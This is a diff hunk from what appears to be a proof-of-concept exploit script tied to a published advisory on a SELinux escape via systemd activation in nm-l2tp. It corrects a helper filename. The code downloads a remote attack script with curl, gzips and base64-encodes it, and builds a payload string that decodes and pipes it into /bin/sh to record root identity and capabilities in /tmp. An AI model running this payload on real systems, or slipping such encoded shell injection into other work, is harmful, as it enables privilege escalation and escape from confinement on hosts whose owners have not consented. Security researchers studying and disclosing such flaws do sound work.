@@ -73,11 +73,11 @@ if [ "${selinux}" == "true" ];then
     echo "[*] in-lining payload"
     # systemd activation-pull selinux escape
     # see https://linnemanlabs.com/posts/confined-root-is-still-root/
-    if [ ! -f activation-pull.sh ];then
+    if [ ! -f activation-pull-restart.sh ];then
       echo "[*] missing activation-pull-restart.sh, pulling from github"
       curl -s -o "activation-pull-restart.sh" "https://raw.githubusercontent.com/linnemanlabs/advisories/refs/heads/main/poc/nm-l2tp/activation-pull-restart.sh"
     fi
-    b64p="$( cat activation-pull.sh | gzip | base64 -w0 )"
+    b64p="$( cat activation-pull-restart.sh | gzip | base64 -w0 )"
     outfile="/tmp/ipsec.out-$( date +%s )"
     payload="\"BCMD='${b64p}';umask 0000;echo \${BCMD} | base64 -d | gzip -d | CMD='{ id; grep ^Cap /proc/self/status; } > ${outfile};chcon -t user_tmp_t ${outfile}' /bin/sh\""
   # fi
